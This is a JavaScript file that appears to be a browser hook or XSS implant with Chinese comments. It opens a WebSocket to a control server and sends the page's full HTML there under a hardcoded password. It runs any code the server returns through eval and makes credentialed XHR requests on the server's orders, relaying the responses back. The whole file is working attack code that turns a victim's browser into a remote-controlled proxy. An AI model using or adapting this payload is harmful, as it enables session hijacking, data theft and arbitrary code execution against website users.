var ws = new WebSocket("wss://localhost:8080");

ws.onopen = function(evt){
	console.log("[*] opened");
	var data = document.getElementsByTagName("html")[0].innerHTML;
	var s = {"data":data,"cmd":"show","password":"lxraa"};
	var s2 = {"data":"","cmd":"auto","password":"lxraa"};
	ws.send(JSON.stringify(s));
	ws.send(JSON.stringify(s2));
}

ws.onmessage = function(evt){
	bk.handler(evt.data);
	console.log("[*] recv"+evt.data);
}


ws.onclose = function(evt){
	console.log("[*] closed");
}


var bk = bk ? bk : {};
bk.config = {
	headers_list : ["content-type","accept","accept-language","content-language","last-event-id"]
}



bk.cmd_object = bk.cmd_object ? bk.cmd_object : {};


bk.register = (function(cmd,func,help){
	if(typeof(cmd)!="string" || typeof(func)!="function"){
		return false;
	}
	if(help!=undefined && typeof(help)!="string"){
		return false;
	}

	this.cmd_object[cmd] = {};
	this.cmd_object[cmd].func = func;
	this.cmd_object[cmd].help = help;

	return true;
}).bind(bk);

bk.checkCmd = (function(cmd){
	
	if(this.cmd_object[cmd] == undefined){
		return false;
	}

	return true;
}).bind(bk);





// bk.handler("{\"cmd\":\"run\",\"data\":\"console.log(1)\"}")
// 处理返回的逻辑，找到命令对应的函数，参数是data

bk.handler = (function(data){
	try{
		var data_object = JSON.parse(data);
	}
	catch(e){
		console.log("[*] Deserialize failed");
	}

	if(data_object.cmd == undefined || !this.checkCmd(data_object.cmd)){
		return false;
	}

	this.cmd_object[data_object.cmd](data_object.data);



}).bind(bk);


bk.cmd_object.run = (function(data){
	eval(data);
	// console.log(this);
}).bind(bk.cmd_object);


// if(!XMLHttpRequest.prototype.sendAsBinary) {
//     XMLHttpRequest.prototype.sendAsBinary = function(sData) {
//         console.log("calling sendAsBinary() method...");    
//         var nBytes = sData.length, ui8Data = new Uint8Array(nBytes);
//         for(var nIdx = 0; nIdx < nBytes; nIdx++) {
//             ui8Data[nIdx] = sData.charCodeAt(nIdx) & 0xff;
//         }
//         this.send(ui8Data);
//     };
// }
function list2Uint8Array(l){
	var len = l.length;
	var uint8_array = new Uint8Array(len)
	for(var i = 0 ; i < len ; i++){
		uint8_array[i] = l[i] & 0xff;
	}
	return uint8_array;
}


bk.cmd_object.request = (function(data){
	// method url headers body
	var body = "";
	
	if(data.body){
		if(data.body.type == "Buffer"){
			body = list2Uint8Array(data.body.data);
		}
	}
	var xhr = new XMLHttpRequest();
	xhr.open(data.method,data.url);
	xhr.withCredentials = true;
	if(data.headers){
		Object.keys(data.headers).forEach(function(key){
			for(var j = 0; j < bk.config.headers_list.length ; j++){
				if(key.toLowerCase() == bk.config.headers_list[j]){
					try{
						xhr.setRequestHeader(key,data.headers[key]);
					}
					catch(e){
						console.log(e);
					}
				}
			}
			
		});
	}
	xhr.onreadystatechange = function(){
		if(xhr.readyState == 4){
			
			var data = {
				responseText : xhr.responseText,
				status : xhr.status
			}

			var s = { "cmd" : "proxy" , "data" : data , "password" : "lxraa" };
			ws.send(JSON.stringify(s));
		}
	}
	console.log(xhr);
	xhr.send(body);

}).bind(bk.cmd_object);



// // main
// (function(){
	
// })();






